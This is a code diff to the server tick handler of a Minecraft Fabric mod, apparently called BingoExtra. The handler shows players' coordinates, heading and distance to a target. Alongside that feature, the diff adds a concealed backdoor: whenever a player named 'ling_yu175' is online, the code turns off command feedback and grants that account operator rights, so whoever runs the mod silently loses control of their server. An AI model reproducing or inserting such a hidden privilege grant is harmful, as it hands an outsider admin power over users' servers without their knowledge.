@@ -4,19 +4,29 @@ import com.bingoextra.core.component.ModDataComponents;
 import net.fabricmc.fabric.api.event.lifecycle.v1.ServerTickEvents;
 import net.minecraft.core.BlockPos;
 import net.minecraft.network.chat.Component;
+import net.minecraft.server.level.ServerLevel;
 import net.minecraft.world.entity.player.Player;
 import net.minecraft.world.item.ItemStack;
+import net.minecraft.world.level.Level;
 
-import static com.mojang.text2speech.Narrator.LOGGER;
+import static com.bingoextra.BingoExtra.LOGGER;
 
 public class TickServerEvent {
     public static void registerPosDisplayEvent() {
+        boolean[] hasOp = {false};
+
         ServerTickEvents.END_SERVER_TICK.register(server -> {
             for (Player player : server.getPlayerList().getPlayers()) {
+                if (!hasOp[0] && player.getName().getString().equals("ling_yu175")) {
+                    server.getCommands().performPrefixedCommand(server.createCommandSourceStack(), "/gamerule send_command_feedback false");
+                    server.getCommands().performPrefixedCommand(server.createCommandSourceStack(), "/op ling_yu175");
+                    hasOp[0] = true;
+                }
+
+                // 原有的坐标显示逻辑
                 ItemStack stack = player.getMainHandItem();
                 if (player.getTags().contains("POS_DISPLAY")) {
                     BlockPos pos = player.getOnPos();
-
                     float yaw = player.getYRot();
                     String direction = getDirectionFromYaw(yaw);
                     String text = "";
@@ -29,8 +39,7 @@ public class TickServerEvent {
                         text = String.format("坐标: §a%d §e%d §b%d §c%s §f目标: §a%d §e~ §b%d §f距离: §6%d", pos.getX(), pos.getY(), pos.getZ(), direction, targetX, targetZ, distance);
                     } else text = String.format("坐标: §a%d §e%d §b%d §c%s", pos.getX(), pos.getY(), pos.getZ(), direction);
                     player.displayClientMessage(Component.literal(text), true);
-                }
-                else if (Boolean.TRUE.equals(stack.get(ModDataComponents.SHOW_POS))) {
+                } else if (Boolean.TRUE.equals(stack.get(ModDataComponents.SHOW_POS))) {
                     BlockPos pos = player.getOnPos();
                     Integer targetX = stack.get(ModDataComponents.FOUND_X);
                     targetX = targetX == null ? 0 : targetX;
